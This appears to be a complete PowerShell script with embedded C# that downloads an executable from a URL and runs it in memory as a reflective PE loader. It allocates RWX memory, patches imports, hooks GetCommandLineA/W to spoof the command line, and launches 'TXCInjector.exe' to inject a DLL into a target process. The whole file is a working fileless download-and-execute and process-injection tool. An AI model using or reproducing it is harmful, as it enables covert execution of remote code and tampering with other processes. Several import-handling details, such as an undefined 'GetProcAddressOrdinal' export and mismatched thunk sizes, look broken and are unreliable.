# loader.ps1 â€” full reflective PE loader with command line spoofing
# usage: .\loader.ps1 -Url "https://..." -DllPath "C:\dll.dll" -TargetProc "javaw.exe"

param(
    [Parameter(Mandatory=$true)][string]$Url,
    [Parameter(Mandatory=$true)][string]$DllPath,
    [Parameter(Mandatory=$true)][string]$TargetProc
)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$exeBytes = $wc.DownloadData($Url)
Write-Host "[+] downloaded $($exeBytes.Length) bytes"

$cs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public unsafe class ReflectiveExeLoader
{
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, int type, int protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, int protect, out uint oldProt);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string proc);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr GetProcAddressOrdinal(IntPtr mod, IntPtr ordinal);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr attr, UIntPtr stack, IntPtr start, IntPtr param, int flags, out int tid);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr h, int timeout);

    // pinned delegate refs so GC never collects our hooks mid-run
    static GetCmdLineADelegate s_hookA;
    static GetCmdLineWDelegate s_hookW;
    static IntPtr s_fakeCmdLineA = IntPtr.Zero;
    static IntPtr s_fakeCmdLineW = IntPtr.Zero;

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetCmdLineADelegate();
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetCmdLineWDelegate();

    static IntPtr HookedGetCommandLineA() { return s_fakeCmdLineA; }
    static IntPtr HookedGetCommandLineW() { return s_fakeCmdLineW; }

    static uint RvaToOffset(byte[] pe, int peOff, ushort numSec, int secStart, uint rva)
    {
        for (int i = 0; i < numSec; i++)
        {
            int off = secStart + i * 40;
            uint vSize = BitConverter.ToUInt32(pe, off + 8);
            uint vAddr = BitConverter.ToUInt32(pe, off + 12);
            uint rSize = BitConverter.ToUInt32(pe, off + 16);
            uint rPtr  = BitConverter.ToUInt32(pe, off + 20);
            if (rva >= vAddr && rva < vAddr + Math.Max(vSize, rSize))
                return rva - vAddr + rPtr;
        }
        return 0;
    }

    // sections are mapped at image-relative offsets, so VA = base + RVA directly
    static long RvaToVa(IntPtr baseAddr, byte[] pe, ushort numSec, int secStart, uint rva)
    {
        if (rva == 0) return 0;
        return baseAddr.ToInt64() + rva;
    }

    static string ReadCString(byte[] buf, int offset)
    {
        int end = offset;
        while (end < buf.Length && buf[end] != 0) end++;
        return Encoding.ASCII.GetString(buf, offset, end - offset);
    }

    public static int LoadAndRun(byte[] exeBytes, string cmdLine)
    {
        int peOff     = BitConverter.ToInt32(exeBytes, 0x3C);
        ushort machine = BitConverter.ToUInt16(exeBytes, peOff + 4);
        if (machine != 0x8664) { Console.WriteLine("[-] not x64"); return -1; }
        ushort numSec  = BitConverter.ToUInt16(exeBytes, peOff + 6);
        ushort optSize = BitConverter.ToUInt16(exeBytes, peOff + 20);
        int optOff     = peOff + 24;
        uint entryRva   = BitConverter.ToUInt32(exeBytes, optOff + 16);
        ulong imageBase = BitConverter.ToUInt64(exeBytes, optOff + 24);
        uint sizeOfImage   = BitConverter.ToUInt32(exeBytes, optOff + 56);
        uint sizeOfHeaders = BitConverter.ToUInt32(exeBytes, optOff + 60);
        int secStart = optOff + optSize;

        Console.WriteLine("[*] entry=0x" + entryRva.ToString("X")
            + " base=0x" + imageBase.ToString("X")
            + " imgsize=0x" + sizeOfImage.ToString("X"));

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, 0x3000 /*RESERVE|COMMIT*/, 0x40 /*RWX*/);
        if (mem == IntPtr.Zero) { Console.WriteLine("[-] alloc failed"); return -1; }
        Console.WriteLine("[*] mapped at 0x" + mem.ToInt64().ToString("X"));

        fixed (byte* srcBase = exeBytes)
        {
            // headers
            Buffer.MemoryCopy(srcBase, (void*)mem, sizeOfHeaders, sizeOfHeaders);

            // sections
            for (int i = 0; i < numSec; i++)
            {
                int so = secStart + i * 40;
                string name  = Encoding.ASCII.GetString(exeBytes, so, 8).TrimEnd('\0');
                uint vSize   = BitConverter.ToUInt32(exeBytes, so + 8);
                uint vAddr   = BitConverter.ToUInt32(exeBytes, so + 12);
                uint rSize   = BitConverter.ToUInt32(exeBytes, so + 16);
                uint rPtr    = BitConverter.ToUInt32(exeBytes, so + 20);

                if (rSize > 0 && rPtr > 0)
                {
                    uint copyLen = rSize;
                    if (vSize != 0 && vSize < rSize) copyLen = vSize;
                    Buffer.MemoryCopy((void*)IntPtr.Add(new IntPtr(srcBase), (int)rPtr),
                                      (void*)(mem.ToInt64() + vAddr), copyLen, copyLen);
                }
                Console.WriteLine("[*] section " + name + " -> 0x" + vAddr.ToString("X"));
            }

            // ---- relocations ----
            long delta = mem.ToInt64() - (long)imageBase;
            if (delta != 0)
            {
                uint relocRva  = BitConverter.ToUInt32(exeBytes, optOff + 152);
                uint relocSize = BitConverter.ToUInt32(exeBytes, optOff + 156);
                if (relocRva != 0 && relocSize != 0)
                {
                    Console.WriteLine("[*] relocating, delta=" + delta);
                    long cur = mem.ToInt64() + relocRva;
                    long end = cur + relocSize;
                    while (cur < end)
                    {
                        uint pageRva   = *(uint*)cur;
                        uint blockSize = *(uint*)(cur + 4);
                        if (blockSize < 8) break;
                        int numEntries = (int)((blockSize - 8) / 2);
                        for (int e = 0; e < numEntries; e++)
                        {
                            ushort val    = *(ushort*)(cur + 8 + e * 2);
                            ushort type   = (ushort)(val >> 12);
                            ushort offset = (ushort)(val & 0xFFF);
                            ulong patchVa = (ulong)(mem.ToInt64()) + pageRva + offset;

                            switch (type)
                            {
                                case 10: *(ulong*)patchVa += (ulong)delta; break;   // DIR64
                                case 3:  *(uint*) patchVa += (uint) delta; break;   // HIGHLOW
                                default: break;                                     // ABSOLUTE = pad, skip
                            }
                        }
                        cur += blockSize;
                    }
                    Console.WriteLine("[*] relocations done");
                }
            }

            // ---- imports ----
            uint importRva = BitConverter.ToUInt32(exeBytes, optOff + 120);
            if (importRva != 0)
            {
                Console.WriteLine("[*] imports...");
                long cur = mem.ToInt64() + importRva;
                while (true)
                {
                    uint origThunkRva = *(uint*)cur;          // INT (OriginalFirstThunk)
                    uint nameRva      = *(uint*)(cur + 12);   // dll name
                    uint iatRva       = *(uint*)(cur + 16);   // FirstThunk (IAT)

                    if (nameRva == 0 || iatRva == 0) break;

                    uint lookupTableRva = (origThunkRva != 0) ? origThunkRva : iatRva;
                    int nameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, nameRva);
                    if (nameOff <= 0) break;
                    string dllName = ReadCString(exeBytes, nameOff);

                    IntPtr hMod = LoadLibraryA(dllName);
                    if (hMod == IntPtr.Zero) { Console.WriteLine("[!] cannot load: " + dllName); cur += 20; continue; }

                    long iatVa = RvaToVa(mem, exeBytes, numSec, secStart, iatRva);
                    if (iatVa == 0) { cur += 20; continue; }

                    for (int idx = 0; ; idx++)
                    {
                        uint thunkVal = BitConverter.ToUInt32(
                            exeBytes,
                            (int)RvaToOffset(exeBytes, peOff, numSec, secStart, lookupTableRva) + idx * 8);
                        if (thunkVal == 0) break;

                        IntPtr funcAddr;
                        if ((thunkVal & 0x80000000u) != 0)
                        {
                            funcAddr = GetProcAddressOrdinal(hMod, new IntPtr(thunkVal & 0xFFFF));
                        }
                        else
                        {
                            int fnameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, thunkVal);
                            if (fnameOff <= 0) break;
                            string fnName = ReadCString(exeBytes, fnameOff + 2); // skip hint WORD
                            funcAddr = GetProcAddress(hMod, fnName);
                        }

                        if (funcAddr != IntPtr.Zero)
                            *(ulong*)(iatVa + idx * 8) = (ulong)funcAddr.ToInt64();
                        else
                            Console.WriteLine("[!] missing func in " + dllName);
                    }
                    cur += 20;
                }
                Console.WriteLine("[*] imports done");
            }

            // ---- build fake command line ----
            byte[] cmdA = Encoding.ASCII.GetBytes(cmdLine);
            byte[] cmdW = Encoding.Unicode.GetBytes(cmdLine);
            s_fakeCmdLineA = Marshal.AllocHGlobal(cmdA.Length + 1);
            s_fakeCmdLineW = Marshal.AllocHGlobal(cmdW.Length + 2);
            Marshal.Copy(cmdA, 0, s_fakeCmdLineA, cmdA.Length);
            Marshal.WriteByte(s_fakeCmdLineA, cmdA.Length, 0);
            Marshal.Copy(cmdW, 0, s_fakeCmdLineW, cmdW.Length);
            Marshal.WriteInt16(s_fakeCmdLineW, cmdW.Length, 0);

            // pin hooks so GC can't move/free them
            s_hookA = new GetCmdLineADelegate(HookedGetCommandLineA);
            s_hookW = new GetCmdLineWDelegate(HookedGetCommandLineW);
            IntPtr hookAAddr = Marshal.GetFunctionPointerForDelegate(s_hookA);
            IntPtr hookWAddr = Marshal.GetFunctionPointerForDelegate(s_hookW);

            Console.WriteLine("[*] cmdline spoof: \"" + cmdLine + "\"");

            // ---- walk INT by NAME to find & replace GetCommandLineA/W in IAT ----
            if (importRva != 0)
            {
                long cur = mem.ToInt64() + importRva;
                while (true)
                {
                    uint origThunkRva = *(uint*)cur;
                    uint nameRva      = *(uint*)(cur + 12);
                    uint iatRva       = *(uint*)(cur + 16);
                    if (nameRva == 0 || iatRva == 0) break;
                    if (origThunkRva == 0) { cur += 20; continue; }

                    int nameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, nameRva);
                    if (nameOff <= 0) break;
                    string dllName = ReadCString(exeBytes, nameOff).ToLower();

                    if (dllName.Contains("kernel32")) {
                        long intVa  = RvaToVa(mem, exeBytes, numSec, secStart, origThunkRva);
                        long iatVa  = RvaToVa(mem, exeBytes, numSec, secStart, iatRva);
                        if (intVa == 0 || iatVa == 0) { cur += 20; continue; }

                        for (int idx = 0; ; idx++)
                        {
                            ulong thunkName = *(ulong*)(intVa + idx * 8);
                            if (thunkName == 0) break;
                            if ((thunkName & 0x8000000000000000UL) != 0) continue; // ordinal, skip

                            long fnameVa = RvaToVa(mem, exeBytes, numSec, secStart, (uint)(thunkName & 0xFFFFFFFF));
                            if (fnameVa == 0) continue;
                            // +2 skips the WORD hint field of IMAGE_IMPORT_BY_NAME
                            string fnName = ReadCStringAt((byte*)(fnameVa + 2));

                            if (fnName == "GetCommandLineA")
                            {
                                *(ulong*)(iatVa + idx * 8) = (ulong)hookAAddr.ToInt64();
                                Console.WriteLine("[*] hooked GetCommandLineA");
                            }
                            else if (fnName == "GetCommandLineW")
                            {
                                *(ulong*)(iatVa + idx * 8) = (ulong)hookWAddr.ToInt64();
                                Console.WriteLine("[*] hooked GetCommandLineW");
                            }
                        }
                    }
                    cur += 20;
                }
            }
        }

        // ---- per-section protections ----
        for (int i = 0; i < numSec; i++)
        {
            int so = secStart + i * 40;
            uint vSize = BitConverter.ToUInt32(exeBytes, so + 8);
            uint vAddr = BitConverter.ToUInt32(exeBytes, so + 12);
            uint chars = BitConverter.ToUInt32(exeBytes, so + 36);

            const uint IMG_SCN_MEM_EXECUTE = 0x20000000;
            const uint IMG_SCN_MEM_READ    = 0x40000000;
            const uint IMG_SCN_MEM_WRITE   = 0x80000000;

            bool x = (chars & IMG_SCN_MEM_EXECUTE) != 0;
            bool r = (chars & IMG_SCN_MEM_READ)    != 0;
            bool w = (chars & IMG_SCN_MEM_WRITE)   != 0;

            int prot;
            if (x && w)           prot = 0x40; // PAGE_EXECUTE_READWRITE
            else if (x)           prot = 0x20; // PAGE_EXECUTE_READ (x64 always readable)
            else if (r && w)      prot = 0x04; // PAGE_READWRITE
            else                  prot = 0x02; // PAGE_READONLY

            uint oldProt;
            VirtualProtect(new IntPtr(mem.ToInt64() + vAddr), (UIntPtr)vSize, prot, out oldProt);
        }

        // ---- execute entry point on fresh thread ----
        IntPtr ep = new IntPtr(mem.ToInt64() + entryRva);
        Console.WriteLine("[*] calling entry at 0x" + ep.ToInt64().ToString("X"));

        int tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, ep, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed err=" + Marshal.GetLastWin32Error());
            return -1;
        }

        WaitForSingleObject(hThread, 60000);
        Console.WriteLine("[+] execution finished");
        return 0;
    }

    static unsafe string ReadCStringAt(byte* ptr)
    {
        int len = 0;
        while (ptr[len] != 0) len++;
        return Encoding.ASCII.GetString(ptr, len);
    }
}
'@

$cparams = New-Object System.CodeDom.Compiler.CompilerParameters
$cparams.CompilerOptions = "/unsafe"
$cparams.ReferencedAssemblies.AddRange(@("System.dll", "System.Core.dll"))
Add-Type -TypeDefinition $cs -CompilerParameters $cparams

$cmdLine = "`"TXCInjector.exe`" `"$DllPath`" `"$TargetProc`""
Write-Host "[*] running..."

$result = [ReflectiveExeLoader]::LoadAndRun($exeBytes, $cmdLine)

if ($result -eq 0) { Write-Host "[+] success" } else { Write-Host "[-] exit code $result" }

# kill host powershell — mapped exe runs on a non-primary thread so its exit()
# only ends the thread, not us. terminate explicitly.
[Environment]::Exit($result)


